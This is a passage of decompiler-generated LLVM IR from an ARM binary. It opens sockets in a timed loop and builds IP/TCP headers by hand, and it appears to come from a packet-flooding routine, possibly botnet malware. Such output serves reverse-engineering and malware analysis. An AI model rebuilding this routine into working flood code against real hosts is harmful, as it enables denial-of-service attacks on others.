  %tmp90 = sub nsw i32 0, %v1_b9f8
  %v4_ba00 = and i32 %tmp90, 4
  %v1_ba10 = urem i32 %v6_b584, 2
  %tmp91 = sub nsw i32 0, %v1_ba10
  %v3_ba18 = and i32 %tmp91, 2
  %v1_ba28 = urem i32 %v6_b5a4, 2
  br label %dec_label_pc_b650

dec_label_pc_b650:                                ; preds = %dec_label_pc_b7c4, %dec_label_pc_b64c
  %stack_var_-60.0 = phi i32 [ %tmp35, %dec_label_pc_b64c ], [ %stack_var_-60.5, %dec_label_pc_b7c4 ]
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_b65c = call i32 @function_14b54(i32 2, i32 1, i32 0)
  store i32 %v3_b65c, i32* %r0.global-to-local, align 4
  %v7_b660 = icmp eq i32 %v3_b65c, -1
  store i1 %v7_b660, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_b65c, i32* @r5, align 4
  br i1 %v7_b660, label %dec_label_pc_b7c4, label %dec_label_pc_b66c

dec_label_pc_b66c:                                ; preds = %dec_label_pc_b650, %dec_label_pc_b7a0
  %v0_b674 = phi i32 [ %v3_b7b4, %dec_label_pc_b7a0 ], [ %v3_b65c, %dec_label_pc_b650 ]
  %stack_var_-60.1 = phi i32 [ %v0_b85c, %dec_label_pc_b7a0 ], [ %stack_var_-60.0, %dec_label_pc_b650 ]
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_b674 = call i32 @function_12f68(i32 %v0_b674, i32 3, i32 0)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_b67c = or i32 %v3_b674, 2048
  store i32 %v1_b67c, i32* %r2.global-to-local, align 4
  %v0_b680 = load i32, i32* @r5, align 4
  store i32 %v0_b680, i32* %r0.global-to-local, align 4
  %v3_b684 = call i32 @function_12f68(i32 %v0_b680, i32 4, i32 %v1_b67c)
  store i32 %v3_b684, i32* %r0.global-to-local, align 4
  %v3_b688 = load i32, i32* %stack_var_-44, align 4
  %v5_b690 = mul i32 %v3_b688, 24
  store i32 %v2_b694, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-64, align 4
  %v2_b6a4 = add i32 %v5_b690, %arg2
  store i32 %v2_b6a4, i32* %r3.global-to-local, align 4
  %v1_b6a8 = add i32 %v2_b6a4, 20
  %v2_b6a8 = inttoptr i32 %v1_b6a8 to i8*
  %v3_b6a8 = load i8, i8* %v2_b6a8, align 1
  %v4_b6a8 = zext i8 %v3_b6a8 to i32
  store i32 %v4_b6a8, i32* %r2.global-to-local, align 4
  %v2_b6ac = icmp ugt i8 %v3_b6a8, 30
  %v7_b6ac = icmp eq i8 %v3_b6a8, 31
  store i1 %v7_b6ac, i1* %cpsr_z.global-to-local, align 1
  %v2_b6b0 = xor i1 %v7_b6ac, true
  %v3_b6b0 = and i1 %v2_b6ac, %v2_b6b0
  br i1 %v3_b6b0, label %bb, label %bb70

bb:                                               ; preds = %dec_label_pc_b66c
  %v5_b6b0 = add i32 %v2_b6a4, 16
  %v6_b6b0 = inttoptr i32 %v5_b6b0 to i32*
  %v7_b6b0 = load i32, i32* %v6_b6b0, align 4
  store i32 %v7_b6b0, i32* %r3.global-to-local, align 4
  br label %bb70

bb70:                                             ; preds = %dec_label_pc_b66c, %bb
  %v4_b6b4 = phi i32 [ %v2_b6a4, %dec_label_pc_b66c ], [ %v7_b6b0, %bb ]
  %v4_b6b4.stack_var_-60.1 = select i1 %v3_b6b0, i32 %v4_b6b4, i32 %stack_var_-60.1
  %v2_b6b8 = xor i1 %v2_b6ac, true
  %v3_b6b8 = or i1 %v7_b6ac, %v2_b6b8
  br i1 %v3_b6b8, label %dec_label_pc_b800, label %dec_label_pc_b6bc

dec_label_pc_b6bc:                                ; preds = %bb70
  store i32 %v3_b4ec, i32* %r2.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i1 %v3_b83c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_b83c, label %dec_label_pc_b848, label %dec_label_pc_b6d0

dec_label_pc_b6d0:                                ; preds = %dec_label_pc_b800, %dec_label_pc_b6bc
  %stack_var_-60.3 = phi i32 [ %v1_b82c, %dec_label_pc_b800 ], [ %v4_b6b4.stack_var_-60.1, %dec_label_pc_b6bc ]
  store i32 %v3_b4ec, i32* %r0.global-to-local, align 4
  %v1_b6d4 = call i32 @function_1484c(i32 %v3_b4ec)
  %v2_b6d4 = trunc i32 %v1_b6d4 to i16
  store i32 %v1_b6d4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b6e0

dec_label_pc_b6e0:                                ; preds = %dec_label_pc_b848, %dec_label_pc_b6d0
  %v0_b85c = phi i32 [ %stack_var_-60.6, %dec_label_pc_b848 ], [ %stack_var_-60.3, %dec_label_pc_b6d0 ]
  %storemerge4 = phi i16 [ %v1_b848, %dec_label_pc_b848 ], [ %v2_b6d4, %dec_label_pc_b6d0 ]
  store i32 %v2_b6e0, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v0_b6e8 = load i32, i32* @r5, align 4
  store i32 %v0_b6e8, i32* %r0.global-to-local, align 4
  %v3_b6ec = call i32 @function_14798(i32 %v0_b6e8, i32 %v2_b6e0, i32 16)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_b6f4 = call i32 @function_15ad0(i32* null)
  store i32 %v2_b6f4, i32* %r0.global-to-local, align 4
  store i32 %v2_b6f4, i32* @r4, align 4
  %v9_b754 = icmp eq i32 %tmp32, %v0_b85c
  %v4_b77c = zext i16 %storemerge4 to i32
  %. = zext i1 %v9_b754 to i32
  %v9_b768 = icmp eq i1 %v9_b754, false
  %v9_b780 = icmp eq i32 %v3_b774, %v4_b77c
  br label %dec_label_pc_b710

dec_label_pc_b700:                                ; preds = %.thread29, %dec_label_pc_b770, %dec_label_pc_b798, %bb73
  %v2_b700 = call i32 @function_15ad0(i32* null)
  %v0_b704 = load i32, i32* @r4, align 4
  %v2_b704 = sub i32 %v2_b700, %v0_b704
  store i32 %v2_b704, i32* %r0.global-to-local, align 4
  %v7_b708 = icmp eq i32 %v2_b704, 10
  store i1 %v7_b708, i1* %cpsr_z.global-to-local, align 1
  %v8_b70c = icmp sgt i32 %v2_b704, 10
  br i1 %v8_b70c, label %dec_label_pc_b7a0, label %dec_label_pc_b710

dec_label_pc_b710:                                ; preds = %dec_label_pc_b700, %dec_label_pc_b6e0
  store i32 256, i32* @r2, align 4
  store i32 %v2_b64c, i32* @r1, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_b730 = load i32, i32* @fp, align 4
  store i32 %v0_b730, i32* @r0, align 4
  %v0_b738 = call i32 @function_14a2c()
  store i32 %v0_b738, i32* %r2.global-to-local, align 4
  %v7_b740 = icmp eq i32 %v0_b738, -1
  store i1 %v7_b740, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v7_b740, label %dec_label_pc_b7f4, label %dec_label_pc_b74c

dec_label_pc_b74c:                                ; preds = %dec_label_pc_b710
  store i32 %tmp32, i32* %r3.global-to-local, align 4
  store i32 %., i32* %r1.global-to-local, align 4
  %v7_b760 = icmp eq i32 %v0_b738, 40
  store i1 %v7_b760, i1* %cpsr_z.global-to-local, align 1
  %tmp92 = icmp ult i32 %v0_b738, 41
  br i1 %tmp92, label %.thread29, label %bb73

.thread29:                                        ; preds = %dec_label_pc_b74c
  store i32 0, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_b700

bb73:                                             ; preds = %dec_label_pc_b74c
  store i1 %v9_b768, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b768, label %dec_label_pc_b700, label %dec_label_pc_b770

dec_label_pc_b770:                                ; preds = %bb73
  store i32 %v3_b774, i32* %r1.global-to-local, align 4
  store i32 %v2_b694, i32* %r3.global-to-local, align 4
  store i32 %v4_b77c, i32* %r2.global-to-local, align 4
  store i1 %v9_b780, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b780, label %dec_label_pc_b788, label %dec_label_pc_b700

dec_label_pc_b788:                                ; preds = %dec_label_pc_b770
  store i32 %v4_b788, i32* %r2.global-to-local, align 4
  store i32 %v1_b78c, i32* %r3.global-to-local, align 4
  store i1 %v2_b790, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b790, label %dec_label_pc_b858, label %dec_label_pc_b798

dec_label_pc_b798:                                ; preds = %dec_label_pc_b788
  store i1 %v2_b798, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b798, label %dec_label_pc_b700, label %dec_label_pc_b7a0

dec_label_pc_b7a0:                                ; preds = %dec_label_pc_b798, %dec_label_pc_b700
  %v0_b7a0 = load i32, i32* @r5, align 4
  store i32 %v0_b7a0, i32* @r0, align 4
  %v1_b7a4 = call i32 @function_15b20(i32 %v0_b7a0)
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_b7b4 = call i32 @function_14b54(i32 2, i32 1, i32 0)
  store i32 %v3_b7b4, i32* %r0.global-to-local, align 4
  %v3_b7b8 = icmp eq i32 %v3_b7b4, -1
  %v8_b7b8 = icmp eq i32 %v3_b7b4, -1
  store i1 %v8_b7b8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_b7b4, i32* @r5, align 4
  br i1 %v3_b7b8, label %dec_label_pc_b7c4, label %dec_label_pc_b66c

dec_label_pc_b7c4:                                ; preds = %dec_label_pc_b7a0, %dec_label_pc_b650, %dec_label_pc_b934
  %stack_var_-60.5 = phi i32 [ %stack_var_-60.0, %dec_label_pc_b650 ], [ %v0_b85c, %dec_label_pc_b934 ], [ %v0_b85c, %dec_label_pc_b7a0 ]
  %v3_b7c4 = load i32, i32* %stack_var_-44, align 4
  %v1_b7c8 = add i32 %v3_b7c4, 1
  store i32 %v1_b7c8, i32* %r3.global-to-local, align 4
  %v0_b7cc = load i32, i32* @r6, align 4
  %v9_b7cc = icmp eq i32 %v0_b7cc, %v1_b7c8
  store i1 %v9_b7cc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_b7c8, i32* %stack_var_-44, align 4
  %v8_b7d4 = icmp sgt i32 %v0_b7cc, %v1_b7c8
  br i1 %v8_b7d4, label %dec_label_pc_b650, label %dec_label_pc_b7d8

dec_label_pc_b7d8:                                ; preds = %dec_label_pc_b7c4
  store i32 %v6_b5c4, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_ba5c

dec_label_pc_b7ec:                                ; preds = %dec_label_pc_b608
  %v0_b7ec = load i32, i32* @fp, align 4
  store i32 %v0_b7ec, i32* @r0, align 4
  %v1_b7f0 = call i32 @function_15b20(i32 %v0_b7ec)
  store i32 %v1_b7f0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b7f4

dec_label_pc_b7f4:                                ; preds = %dec_label_pc_b710, %dec_label_pc_b420, %dec_label_pc_b7ec
  %v1_b7fc = phi i32 [ %v3_b5f8, %dec_label_pc_b420 ], [ %v1_b7f0, %dec_label_pc_b7ec ], [ 0, %dec_label_pc_b710 ]
  store i32 %v3_b420, i32* %r4.global-to-local, align 4
  store i32 %v6_b420, i32* %r5.global-to-local, align 4
  store i32 %v18_b420, i32* %sb.global-to-local, align 4
  store i32 %v27_b420, i32* %lr.global-to-local, align 4
  ret i32 %v1_b7fc

dec_label_pc_b800:                                ; preds = %bb70
  %v1_b800 = add i32 %v4_b6b4, 16
  %v2_b800 = inttoptr i32 %v1_b800 to i32*
  %v3_b800 = load i32, i32* %v2_b800, align 4
  store i32 %v3_b800, i32* %r0.global-to-local, align 4
  %v1_b804 = call i32 @function_149d0(i32 %v3_b800)
  store i32 %v1_b804, i32* %r0.global-to-local, align 4
  store i32 %v1_b804, i32* @r4, align 4
  %v0_b80c = call i32 @function_f570()
  store i32 %v0_b80c, i32* %r0.global-to-local, align 4
  %v3_b810 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b810, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %v5_b81c = mul i32 %v3_b810, 24
  %v2_b820 = add i32 %v5_b81c, %arg2
  store i32 %v2_b820, i32* %r3.global-to-local, align 4
  %v1_b824 = add i32 %v2_b820, 20
  %v2_b824 = inttoptr i32 %v1_b824 to i8*
  %v3_b824 = load i8, i8* %v2_b824, align 1
  %v4_b824 = zext i8 %v3_b824 to i32
  store i32 %v4_b824, i32* %r2.global-to-local, align 4
  %v0_b828 = load i32, i32* @r4, align 4
  %v7_b828 = lshr i32 %v0_b80c, %v4_b824
  %v8_b828 = add i32 %v7_b828, %v0_b828
  store i32 %v8_b828, i32* %r0.global-to-local, align 4
  %v1_b82c = call i32 @function_14828(i32 %v8_b828)
  store i32 %v1_b82c, i32* %r0.global-to-local, align 4
  store i32 %v3_b4ec, i32* %r2.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i1 %v3_b83c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_b83c, label %dec_label_pc_b848, label %dec_label_pc_b6d0

dec_label_pc_b848:                                ; preds = %dec_label_pc_b800, %dec_label_pc_b6bc
  %stack_var_-60.6 = phi i32 [ %v1_b82c, %dec_label_pc_b800 ], [ %v4_b6b4.stack_var_-60.1, %dec_label_pc_b6bc ]
  %v0_b848 = call i32 @function_f570()
  %v1_b848 = trunc i32 %v0_b848 to i16
  store i32 %v0_b848, i32* %r0.global-to-local, align 4
  store i32 %v2_b694, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b6e0

dec_label_pc_b858:                                ; preds = %dec_label_pc_b788
  %v3_b858 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b858, i32* %r4.global-to-local, align 4
  %v1_b85c = load i32, i32* @r8, align 4
  %v5_b85c = mul i32 %v3_b858, 16
  %v6_b85c = add i32 %v1_b85c, %v5_b85c
  %v7_b85c = inttoptr i32 %v6_b85c to i32*
  store i32 %v0_b85c, i32* %v7_b85c, align 4
  %v0_b860 = load i32, i32* @sl, align 4
  %v1_b860 = add i32 %v0_b860, 4
  %v2_b860 = inttoptr i32 %v1_b860 to i32*
  %v3_b860 = load i32, i32* %v2_b860, align 4
  store i32 %v3_b860, i32* %r0.global-to-local, align 4
  %v1_b864 = call i32 @function_149d0(i32 %v3_b860)
  store i32 %v1_b864, i32* %r0.global-to-local, align 4
  %v0_b868 = load i32, i32* %r4.global-to-local, align 4
  %v3_b868 = mul i32 %v0_b868, 16
  %v1_b86c = load i32, i32* @r8, align 4
  %v2_b86c = add i32 %v1_b86c, %v3_b868
  store i32 %v2_b86c, i32* %r4.global-to-local, align 4
  %v2_b870 = add i32 %v2_b86c, 4
  %v3_b870 = inttoptr i32 %v2_b870 to i32*
  store i32 %v1_b864, i32* %v3_b870, align 4
  %v0_b874 = load i32, i32* @sl, align 4
  %v1_b874 = add i32 %v0_b874, 8
  %v2_b874 = inttoptr i32 %v1_b874 to i32*
  %v3_b874 = load i32, i32* %v2_b874, align 4
  store i32 %v3_b874, i32* %r0.global-to-local, align 4
  %v3_b878 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b878, i32* %r5.global-to-local, align 4
  %v1_b87c = call i32 @function_149d0(i32 %v3_b874)
  store i32 %v1_b87c, i32* %r0.global-to-local, align 4
  %v3_b880 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b880, i32* @r4, align 4
  %v0_b884 = load i32, i32* @sl, align 4
  %v1_b884 = add i32 %v0_b884, 2
  %v2_b884 = inttoptr i32 %v1_b884 to i16*
  %v3_b884 = load i16, i16* %v2_b884, align 2
  %v4_b884 = zext i16 %v3_b884 to i32
  store i32 %v4_b884, i32* %r1.global-to-local, align 4
  %v3_b888 = mul i32 %v3_b880, 16
  %v1_b88c = load i32, i32* @r8, align 4
  %v2_b88c = add i32 %v1_b88c, %v3_b888
  store i32 %v2_b88c, i32* %r3.global-to-local, align 4
  %v3_b890 = add i32 %v2_b88c, 12
  %v4_b890 = inttoptr i32 %v3_b890 to i16*
  store i16 %v3_b884, i16* %v4_b890, align 2
  store i32 %v3_b774, i32* %r2.global-to-local, align 4
  %v0_b8a0 = load i32, i32* %r5.global-to-local, align 4
  %v3_b8a0 = mul i32 %v0_b8a0, 16
  store i32 %v1_b8a4, i32* @r7, align 4
  %v1_b8a8 = load i32, i32* @r8, align 4
  %v2_b8a8 = add i32 %v1_b8a8, %v3_b8a0
  store i32 %v2_b8a8, i32* @r5, align 4
  %v2_b8ac = load i32, i32* %r3.global-to-local, align 4
  %v3_b8ac = add i32 %v2_b8ac, 14
  %v4_b8ac = inttoptr i32 %v3_b8ac to i16*
  store i16 %storemerge4, i16* %v4_b8ac, align 2
  %v1_b8b0 = load i32, i32* @r5, align 4
  %v2_b8b0 = add i32 %v1_b8b0, 8
  %v3_b8b0 = inttoptr i32 %v2_b8b0 to i32*
  store i32 %v1_b87c, i32* %v3_b8b0, align 4
  %v0_b8b4 = load i32, i32* @r7, align 4
  store i32 %v0_b8b4, i32* @r0, align 4
  %v0_b8b8 = call i32 @function_13c7c()
  store i32 %v0_b8b8, i32* %r0.global-to-local, align 4
  store i32 %v2_b44c, i32* %r3.global-to-local, align 4
  %v3_b8c0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b8c0, i32* %r2.global-to-local, align 4
  %v2_b8c4 = load i32, i32* @r4, align 4
  %v5_b8c4 = mul i32 %v2_b8c4, 4
  %v6_b8c4 = add i32 %v5_b8c4, %v2_b44c
  %v7_b8c4 = inttoptr i32 %v6_b8c4 to i32*
  store i32 %v0_b8b8, i32* %v7_b8c4, align 4
  %v0_b8c8 = load i32, i32* %r3.global-to-local, align 4
  %v1_b8c8 = load i32, i32* %r2.global-to-local, align 4
  %v4_b8c8 = mul i32 %v1_b8c8, 4
  %v5_b8c8 = add i32 %v4_b8c8, %v0_b8c8
  %v6_b8c8 = inttoptr i32 %v5_b8c8 to i32*
  %v7_b8c8 = load i32, i32* %v6_b8c8, align 4
  store i32 %v7_b8c8, i32* @r4, align 4
  %v1_b8cc = inttoptr i32 %v7_b8c8 to i8*
  %v2_b8cc = load i8, i8* %v1_b8cc, align 1
  %tmp93 = urem i8 %v2_b8cc, 16
  %v1_b8d0 = zext i8 %tmp93 to i32
  %v1_b8d4 = or i32 %v1_b8d0, 64
  store i32 %v1_b8d4, i32* %r3.global-to-local, align 4
  %v1_b8d8 = trunc i32 %v1_b8d4 to i8
  store i8 %v1_b8d8, i8* %v1_b8cc, align 1
  %v0_b8dc = load i32, i32* @r4, align 4
  %v1_b8dc = inttoptr i32 %v0_b8dc to i8*
  %v2_b8dc = load i8, i8* %v1_b8dc, align 1
  %v3_b8dc = zext i8 %v2_b8dc to i32
  %v1_b8e0 = and i32 %v3_b8dc, 240
  %v1_b8e4 = or i32 %v1_b8e0, 5
  store i32 %v1_b8e4, i32* %r2.global-to-local, align 4
  %v1_b8e8 = trunc i32 %v1_b8e4 to i8
  store i8 %v1_b8e8, i8* %v1_b8dc, align 1
  %v0_b8f0 = load i32, i32* @r7, align 4
  %v3_b8f0 = mul i32 %v0_b8f0, 65536
  store i32 %v3_b8f0, i32* %r0.global-to-local, align 4
  %v2_b8f4 = load i32, i32* @r4, align 4
  %v3_b8f4 = add i32 %v2_b8f4, 1
  %v4_b8f4 = inttoptr i32 %v3_b8f4 to i8*
  store i8 %v1_b8f4, i8* %v4_b8f4, align 1
  %v0_b8f8 = load i32, i32* %r0.global-to-local, align 4
  %v3_b8f8 = udiv i32 %v0_b8f8, 65536
  store i32 %v3_b8f8, i32* %r0.global-to-local, align 4
  %v1_b8fc = call i32 @function_1484c(i32 %v3_b8f8)
  %v2_b8fc = trunc i32 %v1_b8fc to i16
  %v3_b900 = load i32, i32* @r4, align 4
  %v4_b900 = add i32 %v3_b900, 2
  %v5_b900 = inttoptr i32 %v4_b900 to i16*
  store i16 %v2_b8fc, i16* %v5_b900, align 2
  store i32 %v3_b638, i32* %r0.global-to-local, align 4
  %v1_b908 = call i32 @function_1484c(i32 %v3_b638)
  %v2_b908 = trunc i32 %v1_b908 to i16
  store i32 %v1_b908, i32* %r0.global-to-local, align 4
  store i32 %v1_b4cc, i32* %r1.global-to-local, align 4
  store i32 %v4_b910, i32* %r2.global-to-local, align 4
  store i1 %v2_b914, i1* %cpsr_z.global-to-local, align 1
  %v3_b918 = load i32, i32* @r4, align 4
  %v4_b918 = add i32 %v3_b918, 4
  %v5_b918 = inttoptr i32 %v4_b918 to i16*
  store i16 %v2_b908, i16* %v5_b918, align 2
  %v0_b91c = load i32, i32* %r2.global-to-local, align 4
  %v1_b91c = trunc i32 %v0_b91c to i8
  %v2_b91c = load i32, i32* @r4, align 4
  %v3_b91c = add i32 %v2_b91c, 8
  %v4_b91c = inttoptr i32 %v3_b91c to i8*
  store i8 %v1_b91c, i8* %v4_b91c, align 1
  %v0_b920 = load i32, i32* @r4, align 4
  %v1_b920 = add i32 %v0_b920, 20
  store i32 %v1_b920, i32* @sl, align 4
  %v0_b924 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b924, label %dec_label_pc_b934, label %dec_label_pc_b928

dec_label_pc_b928:                                ; preds = %dec_label_pc_b858
  store i32 16384, i32* %r0.global-to-local, align 4
  %v1_b92c = call i32 @function_1484c(i32 16384)
  %v2_b92c = trunc i32 %v1_b92c to i16
  store i32 %v1_b92c, i32* %r0.global-to-local, align 4
  %v3_b930 = load i32, i32* @r4, align 4
  %v4_b930 = add i32 %v3_b930, 6
  %v5_b930 = inttoptr i32 %v4_b930 to i16*
  store i16 %v2_b92c, i16* %v5_b930, align 2
  %v2_b938.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_b934

dec_label_pc_b934:                                ; preds = %dec_label_pc_b858, %dec_label_pc_b928
  %v2_b938 = phi i32 [ %v0_b920, %dec_label_pc_b858 ], [ %v2_b938.pre, %dec_label_pc_b928 ]
  %v3_b938 = add i32 %v2_b938, 9
  %v4_b938 = inttoptr i32 %v3_b938 to i8*
  store i8 6, i8* %v4_b938, align 1
  store i32 ptrtoint (i32* @global_var_2290c.90 to i32), i32* %r2.global-to-local, align 4
  %v2_b940 = load i32, i32* @global_var_2290c.90, align 4
  store i32 %v2_b940, i32* %r1.global-to-local, align 4
  %v1_b944 = load i32, i32* @r4, align 4
  %v2_b944 = add i32 %v1_b944, 12
  %v3_b944 = inttoptr i32 %v2_b944 to i32*
  store i32 %v2_b940, i32* %v3_b944, align 4
  %v3_b948 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b948, i32* %r3.global-to-local, align 4
  %v0_b94c = load i32, i32* @r8, align 4
  %v4_b94c = mul i32 %v3_b948, 16
  %v5_b94c = add i32 %v0_b94c, %v4_b94c
  %v6_b94c = inttoptr i32 %v5_b94c to i32*
  %v7_b94c = load i32, i32* %v6_b94c, align 4
  store i32 %v7_b94c, i32* %r2.global-to-local, align 4
  store i32 %v5_b94c, i32* %r3.global-to-local, align 4
  %v1_b958 = load i32, i32* @r4, align 4
  %v2_b958 = add i32 %v1_b958, 16
  %v3_b958 = inttoptr i32 %v2_b958 to i32*
  store i32 %v7_b94c, i32* %v3_b958, align 4
  %v0_b95c = load i32, i32* %r3.global-to-local, align 4
  %v1_b95c = add i32 %v0_b95c, 12
  %v2_b95c = inttoptr i32 %v1_b95c to i16*
  %v3_b95c = load i16, i16* %v2_b95c, align 2
  %v1_b960 = add i32 %v0_b95c, 8
  %v2_b960 = inttoptr i32 %v1_b960 to i32*
  %v3_b960 = load i32, i32* %v2_b960, align 4
  store i32 %v3_b960, i32* %r1.global-to-local, align 4
  %v2_b964 = load i32, i32* @r4, align 4
  %v3_b964 = add i32 %v2_b964, 20
  %v4_b964 = inttoptr i32 %v3_b964 to i16*
  store i16 %v3_b95c, i16* %v4_b964, align 2
  %v0_b968 = load i32, i32* %r1.global-to-local, align 4
  %v1_b968 = load i32, i32* @sl, align 4
  %v2_b968 = add i32 %v1_b968, 4
  %v3_b968 = inttoptr i32 %v2_b968 to i32*
  store i32 %v0_b968, i32* %v3_b968, align 4
  %v0_b96c = load i32, i32* @sl, align 4
  %v1_b96c = add i32 %v0_b96c, 13
  %v2_b96c = inttoptr i32 %v1_b96c to i8*
  %v3_b96c = load i8, i8* %v2_b96c, align 1
  %v4_b96c = zext i8 %v3_b96c to i32
  store i32 %v4_b96c, i32* %r2.global-to-local, align 4
  %v0_b970 = load i32, i32* %r3.global-to-local, align 4
  %v1_b970 = add i32 %v0_b970, 4
  %v2_b970 = inttoptr i32 %v1_b970 to i32*
  %v3_b970 = load i32, i32* %v2_b970, align 4
  store i32 %v3_b970, i32* %r1.global-to-local, align 4
  %v1_b974 = or i32 %v4_b96c, 1
  store i32 %v1_b974, i32* %r2.global-to-local, align 4
  %v1_b978 = add i32 %v0_b970, 14
  %v2_b978 = inttoptr i32 %v1_b978 to i16*
  %v3_b978 = load i16, i16* %v2_b978, align 2
  %v4_b978 = zext i16 %v3_b978 to i32
  store i32 %v4_b978, i32* %r3.global-to-local, align 4
  %v1_b97c = trunc i32 %v1_b974 to i8
  store i8 %v1_b97c, i8* %v2_b96c, align 1
  %v0_b980 = load i32, i32* %r3.global-to-local, align 4
  %v1_b980 = trunc i32 %v0_b980 to i16
  %v2_b980 = load i32, i32* @sl, align 4
  %v3_b980 = add i32 %v2_b980, 2
  %v4_b980 = inttoptr i32 %v3_b980 to i16*
  store i16 %v1_b980, i16* %v4_b980, align 2
  %v0_b984 = load i32, i32* @sl, align 4
  %v1_b984 = add i32 %v0_b984, 12
  %v2_b984 = inttoptr i32 %v1_b984 to i8*
  %v3_b984 = load i8, i8* %v2_b984, align 1
  %v4_b984 = zext i8 %v3_b984 to i32
  store i32 %v4_b984, i32* %r3.global-to-local, align 4
  %v1_b988 = add i32 %v0_b984, 13
  %v2_b988 = inttoptr i32 %v1_b988 to i8*
  %v3_b988 = load i8, i8* %v2_b988, align 1
  %v4_b988 = zext i8 %v3_b988 to i32
  %tmp94 = urem i8 %v3_b984, 16
  %v1_b98c = zext i8 %tmp94 to i32
  %v1_b990 = or i32 %v1_b98c, 128
  store i32 %v1_b990, i32* %r3.global-to-local, align 4
  %v1_b994 = or i32 %v4_b988, 16
  store i32 %v1_b994, i32* %r2.global-to-local, align 4
  %v0_b998 = load i32, i32* %r1.global-to-local, align 4
  %v2_b998 = add i32 %v0_b984, 8
  %v3_b998 = inttoptr i32 %v2_b998 to i32*
  store i32 %v0_b998, i32* %v3_b998, align 4
  %v0_b99c = load i32, i32* %r3.global-to-local, align 4
  %v1_b99c = trunc i32 %v0_b99c to i8
  %v2_b99c = load i32, i32* @sl, align 4
  %v3_b99c = add i32 %v2_b99c, 12
  %v4_b99c = inttoptr i32 %v3_b99c to i8*
  store i8 %v1_b99c, i8* %v4_b99c, align 1
  %v0_b9a0 = load i32, i32* %r2.global-to-local, align 4
  %v1_b9a0 = trunc i32 %v0_b9a0 to i8
  %v2_b9a0 = load i32, i32* @sl, align 4
  %v3_b9a0 = add i32 %v2_b9a0, 13
  %v4_b9a0 = inttoptr i32 %v3_b9a0 to i8*
  store i8 %v1_b9a0, i8* %v4_b9a0, align 1
  %v0_b9a4 = call i32 @function_f570()
  %v1_b9a4 = trunc i32 %v0_b9a4 to i16
  store i32 %v0_b9a4, i32* %r0.global-to-local, align 4
  store i32 %v1_b50c, i32* %r1.global-to-local, align 4
  %v0_b9ac = load i32, i32* @sl, align 4
  %v1_b9ac = add i32 %v0_b9ac, 13
  %v2_b9ac = inttoptr i32 %v1_b9ac to i8*
  %v3_b9ac = load i8, i8* %v2_b9ac, align 1
  %v4_b9ac = zext i8 %v3_b9ac to i32
  store i32 %v1_b9b0, i32* %r2.global-to-local, align 4
  %v1_b9b4 = and i32 %v4_b9ac, 223
  %v5_b9b8 = or i32 %v1_b9b4, %v4_b9b8
  store i32 %v5_b9b8, i32* %r3.global-to-local, align 4
  %v1_b9bc = trunc i32 %v5_b9b8 to i8
  store i8 %v1_b9bc, i8* %v2_b9ac, align 1
  %v0_b9c4 = load i32, i32* @sl, align 4
  %v1_b9c4 = add i32 %v0_b9c4, 13
  %v2_b9c4 = inttoptr i32 %v1_b9c4 to i8*
  %v3_b9c4 = load i8, i8* %v2_b9c4, align 1
  %v4_b9c4 = zext i8 %v3_b9c4 to i32
  store i32 %v1_b9c8, i32* %r3.global-to-local, align 4
  %v1_b9cc = and i32 %v4_b9c4, 239
  %v5_b9d0 = or i32 %v1_b9cc, %v4_b9d0
  store i32 %v5_b9d0, i32* %r2.global-to-local, align 4
  %v1_b9d4 = trunc i32 %v5_b9d0 to i8
  store i8 %v1_b9d4, i8* %v2_b9c4, align 1
  store i32 %v1_b54c, i32* %r1.global-to-local, align 4
  %v0_b9dc = load i32, i32* @sl, align 4
  %v1_b9dc = add i32 %v0_b9dc, 13
  %v2_b9dc = inttoptr i32 %v1_b9dc to i8*
  %v3_b9dc = load i8, i8* %v2_b9dc, align 1
  %v4_b9dc = zext i8 %v3_b9dc to i32
  store i32 %v1_b9e0, i32* %r2.global-to-local, align 4
  %v1_b9e4 = and i32 %v4_b9dc, 247
  %v5_b9e8 = or i32 %v1_b9e4, %v4_b9e8
  store i32 %v5_b9e8, i32* %r3.global-to-local, align 4
  %v1_b9ec = trunc i32 %v5_b9e8 to i8
  store i8 %v1_b9ec, i8* %v2_b9dc, align 1
  %v0_b9f4 = load i32, i32* @sl, align 4
  %v1_b9f4 = add i32 %v0_b9f4, 13
  %v2_b9f4 = inttoptr i32 %v1_b9f4 to i8*
